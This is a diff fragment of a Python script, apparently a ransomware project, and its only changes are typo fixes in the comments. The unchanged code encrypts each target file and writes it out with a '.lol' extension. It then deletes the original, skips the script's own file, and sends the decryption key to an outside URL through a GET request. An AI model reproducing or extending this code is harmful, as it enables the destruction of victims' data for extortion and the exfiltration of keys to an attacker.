@@ -20,20 +20,20 @@ class D_E_ncrypt(object):              # Encrypter Class (Our main Class )
         try:                           # Run Try/Except So We Dont Run in to Error
             if (os.path.isdir(loc.Target) != True) :    # Cheak If Its File not Directory                        
 
-                with open(loc.Target, "rb") as File:    # Opeing  File 
+                with open(loc.Target, "rb") as File:    # Opening  File 
                         Date    = File.read()           # Reading File & Saving it In tmp Var
                
                 FileName    = loc.Target                # File name
                 Encrypted   = loc.BoxM.encrypt(Date) # Encrypting tmp Var
 
-                if(loc.Target != sys.argv[0]):          # If Target File is not Our own script Do this  
+                if(loc.Target != sys.argv[0]):          # If Target File is not our own script Do this  
                     with open(f"{FileName}.lol","wb") as File: # Opeing  File To write File
                         print(f"FILE -> {FileName}")    # Printing File name for batter Debug
                         File.write(Encrypted)           # Writeing The File 
                     os.remove(loc.Target)               # Removing OG File
         except Exception as e:print(f"Error -> {e}")
     def SendKey(Key):               # We Pass Decrypt Key and Api url To Make Get request
-        requests.get(Key.Url)       # We send request 
+        requests.get(Key.Url)       # Then We send request 
 
                  
 
